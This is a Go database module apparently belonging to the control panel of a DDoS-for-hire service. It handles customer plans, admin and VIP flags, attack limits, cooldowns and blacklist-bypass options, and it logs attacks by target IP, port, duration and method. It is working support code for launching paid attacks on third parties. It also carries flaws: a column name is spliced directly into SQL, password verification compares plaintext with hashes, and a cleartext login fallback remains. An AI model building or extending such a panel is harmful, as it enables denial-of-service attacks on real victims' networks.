package database

import (
	"arismcnc/utils"
	"crypto/rand"
	"database/sql"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"golang.org/x/crypto/bcrypt"
)

type Database struct {
	DB *sql.DB
}

type AccountInfo struct {
	ID              int
	Username        string
	Admin           int
	Expiry          string
	Vip             int
	Private         int
	Concurrents     int
	Cooldown        int
	Maxtime         int
	ApiAccess       int
	BypassSpam      int
	BypassBlacklist int
	PowerSaving     int
	CreatedBy       string
}

// ConnectDB initializes a connection to the database using the given configuration
func ConnectDB(config *utils.Config) (*Database, error) {
	dsn := fmt.Sprintf("%s:%s@tcp(%s)/%s", config.DBUser, config.DBPass, config.DBHost, config.DBName)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return nil, err
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	return &Database{DB: db}, nil
}

// AuthenticateUser verifies the user's password
func (db *Database) AuthenticateUser(username, password string) bool {
	var storedPassword string
	query := "SELECT password FROM users WHERE username = ?"
	err := db.DB.QueryRow(query, username).Scan(&storedPassword)
	if err != nil {
		log.Printf("failed to authenticate user %s: %v", username, err)
		return false
	}

	// Check if this is a bcrypt hash
	err = bcrypt.CompareHashAndPassword([]byte(storedPassword), []byte(password))
	if err == nil {
		return true
	}

	// Fallback to cleartext check for legacy users until they reset
	if password == storedPassword {
		// Auto-upgrade password
		go db.ChangePassword(username, password)
		return true
	}

	return false
}

// GetAccountInfo retrieves account information for a given username
func (db *Database) GetAccountInfo(username string) AccountInfo {
	// Prepare the SELECT query
	query := `
		SELECT 
			id, username, admin, vip, private, expiry, concurrents, 
			cooldown, maxtime, api_access, powersaving_bypass, 
			spam_bypass, blacklist_bypass, created_by
		FROM users 
		WHERE username = ?`

	// Execute the query
	row := db.DB.QueryRow(query, username)

	// Initialize AccountInfo to hold the result
	var accInfo AccountInfo

	// Scan the row into the AccountInfo struct
	err := row.Scan(
		&accInfo.ID,
		&accInfo.Username,
		&accInfo.Admin,
		&accInfo.Vip,
		&accInfo.Private,
		&accInfo.Expiry,
		&accInfo.Concurrents,
		&accInfo.Cooldown,
		&accInfo.Maxtime,
		&accInfo.ApiAccess,
		&accInfo.PowerSaving,
		&accInfo.BypassSpam,
		&accInfo.BypassBlacklist,
		&accInfo.CreatedBy,
	)
	if err != nil {
		log.Println("Error scanning row:", err)
		// Return a default AccountInfo in case of error
		return AccountInfo{}
	}

	return accInfo
}

func (db *Database) IsAccountExpired(username string) bool {
	var expiryStr string
	err := db.DB.QueryRow("SELECT expiry FROM users WHERE username = ?", username).Scan(&expiryStr)
	if err != nil {
		// Handle error
		fmt.Println("Error fetching expiry time:", err)
		return true
	}

	// Parse the expiry datetime string into a time.Time object
	expiryTime, err := time.Parse("2006-01-02 15:04:05", expiryStr)
	if err != nil {
		// Handle error
		fmt.Println("Error parsing expiry time:", err)
		return true
	}

	if time.Now().After(expiryTime) {
		return true
	}
	return false
}

func (db *Database) IsSpamming(username string) bool {
	// Sprawdź, czy użytkownik spammował jakikolwiek target co najmniej 3 razy w ciągu ostatnich 10 minut
	var countTarget int
	err := db.DB.QueryRow(
		"SELECT COUNT(DISTINCT target) FROM attacks WHERE username = ? AND hitted > DATE_SUB(NOW(), INTERVAL 10 MINUTE) GROUP BY target HAVING COUNT(id) >= 3",
		username,
	).Scan(&countTarget)
	if err == sql.ErrNoRows {
		return false
	} else if err != nil {
		log.Println("Error querying target count:", err)
		return false
	}

	// Jeśli użytkownik spammował co najmniej 1 target co najmniej 3 razy
	if countTarget > 0 {
		// Użytkownik jest na cooldownie przed atakowaniem jakiegokolwiek targetu
		return true
	}

	return false
}

func (db *Database) IsTargetCurrentlyUnderAttack(targetID string) bool {
	query := "SELECT COUNT(*) as count FROM attacks WHERE target = ? AND end > NOW()"
	rows, err := db.DB.Query(query, targetID)
	if err != nil {
		log.Println(err)
		return false
	}
	defer rows.Close()

	if !rows.Next() {
		return false
	}

	var count int
	if err := rows.Scan(&count); err != nil {
		log.Println(err)
		return false
	}

	return count > 0
}

func (db *Database) GetTotalUsers() int {
	query := "SELECT COUNT(*) as count FROM users"
	rows, err := db.DB.Query(query)
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()

	if !rows.Next() {
		return 0
	}

	var count int
	if err := rows.Scan(&count); err != nil {
		log.Println(err)
		return 0
	}

	return count
}

func (db *Database) GetTotalActiveUsers() int {
	query := "SELECT COUNT(*) as count FROM users WHERE expiry > NOW()"
	rows, err := db.DB.Query(query)
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()

	if !rows.Next() {
		return 0
	}

	var count int
	if err := rows.Scan(&count); err != nil {
		log.Println(err)
		return 0
	}

	return count
}

func (db *Database) GetTotalExpiredUsers() int {
	query := "SELECT COUNT(*) as count FROM users WHERE expiry < NOW()"
	rows, err := db.DB.Query(query)
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()

	if !rows.Next() {
		return 0
	}

	var count int
	if err := rows.Scan(&count); err != nil {
		log.Println(err)
		return 0
	}

	return count
}

func (db *Database) GetCurrentAttacksLength() int {
	rows, err := db.DB.Query("SELECT COUNT(*) as target FROM attacks WHERE end > NOW()")
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()
	if !rows.Next() {
		return 0
	}
	var target int
	rows.Scan(&target)
	return target
}

type CurrentAttack struct {
	Username string
	Target   string
	Port     string
	Duration int
	Method   string
	End      string
}

func (db *Database) GetAllAttacks() []CurrentAttack {
	rows, err := db.DB.Query("SELECT username, target, port, duration, method, end FROM attacks")
	if err != nil {
		log.Println(err)
		return nil
	}
	defer rows.Close()
	var attacks []CurrentAttack
	for rows.Next() {
		var attack CurrentAttack
		rows.Scan(&attack.Username, &attack.Target, &attack.Port, &attack.Duration, &attack.Method, &attack.End)
		attacks = append(attacks, attack)
	}
	return attacks
}

func (db *Database) GetCurrentAttacks() []CurrentAttack {
	rows, err := db.DB.Query("SELECT username, target, port, duration, method, end FROM attacks WHERE end > NOW()")
	if err != nil {
		log.Println(err)
		return nil
	}
	defer rows.Close()
	var attacks []CurrentAttack
	for rows.Next() {
		var attack CurrentAttack
		rows.Scan(&attack.Username, &attack.Target, &attack.Port, &attack.Duration, &attack.Method, &attack.End)
		attacks = append(attacks, attack)
	}
	return attacks
}

func (db *Database) AddDaysEveryone(days int) error {
	_, err := db.DB.Exec("UPDATE users SET expiry = DATE_ADD(expiry, INTERVAL ? DAY)", days)
	if err != nil {
		log.Println("Error adding days to all users:", err)
		return err
	}
	return nil
}

func SetupDatabaseSchema(db *sql.DB) error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS attacks (
			id INT(11) NOT NULL AUTO_INCREMENT,
			username VARCHAR(255) NOT NULL,
			target VARCHAR(255) NOT NULL,
			port VARCHAR(10) NOT NULL,
			duration INT(11) NOT NULL,
			method VARCHAR(255) NOT NULL,
			hitted DATETIME DEFAULT CURRENT_TIMESTAMP,
			end DATETIME NOT NULL,
			PRIMARY KEY (id)
		) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;`,

		`CREATE TABLE IF NOT EXISTS users (
			id INT(11) NOT NULL AUTO_INCREMENT,
			username VARCHAR(50) NOT NULL,
			password VARCHAR(255) NOT NULL,
			ip VARCHAR(111) NOT NULL DEFAULT 'None',
			admin INT(11) NOT NULL DEFAULT 0,
			vip INT(11) NOT NULL DEFAULT 0,
			private INT(11) NOT NULL DEFAULT 0,
			expiry DATETIME DEFAULT NULL,
			concurrents INT(11) NOT NULL DEFAULT 1,
			cooldown INT(11) NOT NULL DEFAULT 60,
			maxtime INT(11) NOT NULL DEFAULT 60,
			api_access INT(11) NOT NULL DEFAULT 0,
			powersaving_bypass INT(11) NOT NULL DEFAULT 0,
			spam_bypass INT(11) NOT NULL DEFAULT 0,
			blacklist_bypass INT(11) NOT NULL DEFAULT 0,
			created_by VARCHAR(111) DEFAULT NULL,
			PRIMARY KEY (id),
			UNIQUE KEY username (username)
		) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;`,
	}

	for _, query := range queries {
		if _, err := db.Exec(query); err != nil {
			return fmt.Errorf("error executing database setup query: %v", err)
		}
	}

	// Modify table structure if needed
	modifyQueries := []string{
		`ALTER TABLE attacks MODIFY id INT(11) NOT NULL AUTO_INCREMENT;`,
		`ALTER TABLE users MODIFY id INT(11) NOT NULL AUTO_INCREMENT;`,
	}

	for _, query := range modifyQueries {
		if _, err := db.Exec(query); err != nil {
			return fmt.Errorf("error executing database modify query: %v", err)
		}
	}

	return nil
}

func GenerateRandomPassword(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	password := make([]byte, length)
	for i := range password {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		password[i] = charset[num.Int64()]
	}
	return string(password), nil
}

func CreateDefaultUser(db *sql.DB) error {
	// Check if there are any users in the users table
	var userCount int
	err := db.QueryRow("SELECT COUNT(*) FROM users").Scan(&userCount)
	if err != nil {
		return fmt.Errorf("error checking user count: %v", err)
	}

	// If users already exist, no need to create a default user
	if userCount > 0 {
		return nil
	}

	// Generate a random password for the root user
	password, err := GenerateRandomPassword(12)
	if err != nil {
		return fmt.Errorf("error generating random password: %v", err)
	}

	hashedBytes, err := bcrypt.GenerateFromPassword([]byte(password), 10)
	if err != nil {
		return fmt.Errorf("error hashing default user password: %v", err)
	}
	hashedPassword := string(hashedBytes)

	// Insert the root user with the specified privileges
	_, err = db.Exec(`
		INSERT INTO users (
			id, username, password, ip, admin, vip, private, expiry,
			concurrents, cooldown, maxtime, api_access, powersaving_bypass, spam_bypass, blacklist_bypass, created_by
		) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, 1, "root", hashedPassword, "None", 1, 1, 1, "9999-12-31 23:59:59", 9999, 0, 9999, 1, 1, 1, 1, "generated")
	if err != nil {
		return fmt.Errorf("error creating default root user: %v", err)
	}

	// Write the root credentials to default_user.txt
	credentials := fmt.Sprintf("root:%s\n", password)
	err = ioutil.WriteFile("default_user.txt", []byte(credentials), 0600)
	if err != nil {
		return fmt.Errorf("error writing default user credentials to file: %v", err)
	}

	log.Println("Default root user created with credentials saved in default_user.txt")
	return nil
}

func (db *Database) ClearLogs() bool {
	_, err := db.DB.Exec("DELETE FROM attacks") // Usuwanie wszystkich rekordów z tabeli 'attacks'
	if err != nil {
		log.Println("Failed to clear logs:", err)
		return false
	}
	return true
}

func (db *Database) GetCurrentAttacksLength2(method string) int {
	// Używamy parametrów zapytania, aby uniknąć SQL Injection
	query := "SELECT COUNT(*) as target FROM attacks WHERE end > NOW() AND method = ?"
	rows, err := db.DB.Query(query, method)
	if err != nil {
		log.Println("Error executing query:", err)
		return 0
	}
	defer rows.Close()

	// Sprawdzamy, czy zapytanie zwróciło jakieś wiersze
	if !rows.Next() {
		log.Println("No rows returned from query.")
		return 0
	}

	var target int
	err = rows.Scan(&target)
	if err != nil {
		log.Println("Error scanning result:", err)
		return 0
	}

	return target
}

func (db *Database) HowLongOnGlobalCooldown(cooldown int) int {
	var hittedStr string
	var endStr string
	err := db.DB.QueryRow("SELECT hitted, NOW() FROM attacks ORDER BY id DESC LIMIT 1;").Scan(&hittedStr, &endStr)
	if err != nil {
		fmt.Println("Error fetching last global hit time:", err)
		return 0
	}

	hittedTime, err := time.Parse("2006-01-02 15:04:05", hittedStr)
	if err != nil {
		fmt.Println("Error parsing hitted time:", err)
		return 0
	}

	endTime, err := time.Parse("2006-01-02 15:04:05", endStr)
	if err != nil {
		fmt.Println("Error parsing end time:", err)
		return 0
	}

	remainingCooldown := int(endTime.Sub(hittedTime).Seconds())

	if cooldown-remainingCooldown < 0 {
		return 0
	}

	return cooldown - remainingCooldown
}

func (db *Database) HowLongOnCooldown(username string, cooldown int) int {
	var hittedStr string
	var endStr string
	err := db.DB.QueryRow("SELECT hitted, NOW() FROM attacks WHERE username = ? ORDER BY id DESC LIMIT 1;", username).Scan(&hittedStr, &endStr)
	if err != nil {
		fmt.Println("Error fetching hitted time:", err)
		return 0
	}

	hittedTime, err := time.Parse("2006-01-02 15:04:05", hittedStr)
	if err != nil {
		fmt.Println("Error parsing hitted time:", err)
		return 0
	}

	endTime, err := time.Parse("2006-01-02 15:04:05", endStr)
	if err != nil {
		fmt.Println("Error parsing end time:", err)
		return 0
	}

	remainingCooldown := int(endTime.Sub(hittedTime).Seconds())

	if cooldown-remainingCooldown < 0 {
		return 0
	}

	return cooldown - remainingCooldown
}

func (db *Database) GetUserCurrentAttacksCount(username string) int {
	rows, err := db.DB.Query("SELECT COUNT(*) as target FROM attacks WHERE username = ? AND end > NOW()", username)
	if err != nil {
		log.Println(err)
		return 0
	}
	defer rows.Close()
	if !rows.Next() {
		return 0
	}
	var target int
	rows.Scan(&target)
	return target
}

func (db *Database) LogAttack(username string, target string, port string, duration int, method string) {
	_, err := db.DB.Exec("INSERT INTO attacks (username, target, port, duration, method, hitted, end) VALUES (?, ?, ?, ?, ?, NOW(), DATE_ADD(NOW(), INTERVAL ? SECOND))", username, target, port, duration, method, duration)
	if err != nil {
		log.Println(err)
	}
}

type User2 struct {
	Username             string
	Password             string
	Concurrents          int
	MaxTime              int
	PlanLengthDays       int
	APIAccess            int
	VIP                  int
	Cooldown             int
	Admin                int
	BypassPowerSaving    int
	BypassSpamProtection int
	BypassBlacklist      int
	Expiry               time.Time // Calculate expiry based on PlanLengthDays
	IP                   string    // Optional, set to default if not provided
	CreatedBy            string
}

func (db *Database) AddDaysToExpiry(username string, days int) error {
	// SQL to update expiry date by adding days
	query := `
		UPDATE users
		SET expiry = DATE_ADD(expiry, INTERVAL ? DAY)
		WHERE username = ?
	`

	// Execute the query
	_, err := db.DB.Exec(query, days, username)
	if err != nil {
		return fmt.Errorf("failed to add days to expiry for user %s: %w", username, err)
	}

	return nil
}

func (db *Database) UserExists(username string) (bool, error) {
	// Query to check if the user exists
	query := `SELECT COUNT(*) FROM users WHERE username = ?`

	var count int
	err := db.DB.QueryRow(query, username).Scan(&count)
	if err != nil {
		return false, fmt.Errorf("error checking user existence: %w", err)
	}

	return count > 0, nil
}

func (db *Database) RemoveUser(username string) (bool, error) {
	// Query to delete the user
	query := `DELETE FROM users WHERE username = ?`

	// Execute the delete query
	result, err := db.DB.Exec(query, username)
	if err != nil {
		return false, fmt.Errorf("error removing user: %w", err)
	}

	// Check how many rows were affected
	rowsAffected, err := result.RowsAffected()
	if err != nil {
		return false, fmt.Errorf("error retrieving rows affected: %w", err)
	}

	// Return true if a user was removed, false otherwise
	return rowsAffected > 0, nil
}

func (db *Database) SetDaysForExpiry(username string, days int) error {
	// SQL to set expiry date to now + days
	query := `
		UPDATE users
		SET expiry = DATE_ADD(NOW(), INTERVAL ? DAY)
		WHERE username = ?
	`

	// Execute the query
	_, err := db.DB.Exec(query, days, username)
	if err != nil {
		return fmt.Errorf("failed to set expiry days for user %s: %w", username, err)
	}

	return nil
}

// AddUser inserts a new user into the database based on the User struct fields
func (db *Database) AddUser(user User2) error {
	// Calculate expiry date based on the plan length in days
	user.Expiry = time.Now().AddDate(0, 0, user.PlanLengthDays)

	// Set a default IP if none is provided
	if user.IP == "" {
		user.IP = "None"
	}

	// SQL query with placeholders
	query := `
		INSERT INTO users (
			username, password, ip, admin, vip, private, expiry, concurrents,
			cooldown, maxtime, api_access, powersaving_bypass, spam_bypass, blacklist_bypass, created_by
		) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`

	hashedBytes, err := bcrypt.GenerateFromPassword([]byte(user.Password), 10)
	if err != nil {
		return fmt.Errorf("failed to hash password: %w", err)
	}
	user.Password = string(hashedBytes)

	// Execute the query with user values
	_, err = db.DB.Exec(query,
		user.Username,
		user.Password,
		user.IP,
		user.Admin,
		user.VIP,
		0, // Private is set to 0 as not specified in your example; adjust if needed
		user.Expiry,
		user.Concurrents,
		user.Cooldown,
		user.MaxTime,
		user.APIAccess,
		user.BypassPowerSaving,
		user.BypassSpamProtection,
		user.BypassBlacklist,
		user.CreatedBy,
	)

	// Error handling
	if err != nil {
		return fmt.Errorf("failed to add user: %w", err)
	}

	return nil
}

type User struct {
	Username    string
	Expiry      string
	IP          string
	Admin       int
	Vip         int
	Private     int
	Concurrents int
	Maxtime     int
	Cooldown    int
}

func (db *Database) GetAllUsers() ([]User, error) {
	rows, err := db.DB.Query("SELECT username, expiry, ip, admin, vip, private, concurrents, maxtime, cooldown FROM users")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var user User
		if err := rows.Scan(&user.Username, &user.Expiry, &user.IP, &user.Admin, &user.Vip, &user.Private, &user.Concurrents, &user.Maxtime, &user.Cooldown); err != nil {
			return nil, err
		}
		users = append(users, user)
	}
	return users, nil
}

func (db *Database) ChangePassword(username string, newPassword string) error {
	hashedBytes, err := bcrypt.GenerateFromPassword([]byte(newPassword), 10)
	if err != nil {
		return fmt.Errorf("failed to hash password: %w", err)
	}

	_, err = db.DB.Exec("UPDATE users SET password = ? WHERE username = ?", string(hashedBytes), username)
	return err
}

func (db *Database) ChangeOption(username string, field string, value string) error {
	// Construct SQL query dynamically
	query := fmt.Sprintf("UPDATE users SET %s = ? WHERE username = ?", field)

	// Execute the query
	_, err := db.DB.Exec(query, value, username)
	if err != nil {
		return fmt.Errorf("failed to update field %s for user %s: %w", field, username, err)
	}

	return nil
}

func (db *Database) CheckIfIpExists(user string) bool {
	rows, err := db.DB.Query("SELECT ip FROM users WHERE username = ?", user)
	if err != nil {
		log.Println(err)
		return false
	}
	defer rows.Close()
	if !rows.Next() {
		return false
	}
	var ip string
	rows.Scan(&ip)
	if ip == "None" {
		return false
	}
	return true
}

func (db *Database) UpdateIp(username string, ip string) {
	_, err := db.DB.Exec("UPDATE users SET ip = ? WHERE username = ?", ip, username)
	if err != nil {
		log.Println(err)
	}
}

func (db *Database) VerifyPassword(username, password string) (bool, error) {
	storedPassword, err := db.GetPassword(username)
	if err != nil {
		return false, err
	}
	return storedPassword == password, nil
}

func (db *Database) GetPassword(username string) (string, error) {
	// Query to retrieve the password from the users table
	query := "SELECT password FROM users WHERE username = ?"

	var storedPassword string
	err := db.DB.QueryRow(query, username).Scan(&storedPassword)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return "", errors.New("user not found")
		}
		return "", err
	}

	return storedPassword, nil
}

func (db *Database) GetUserTotalAttacks(username string) int {
	var count int
	err := db.DB.QueryRow("SELECT COUNT(*) FROM attacks WHERE username = ?", username).Scan(&count)
	if err != nil {
		return 0
	}
	return count
}
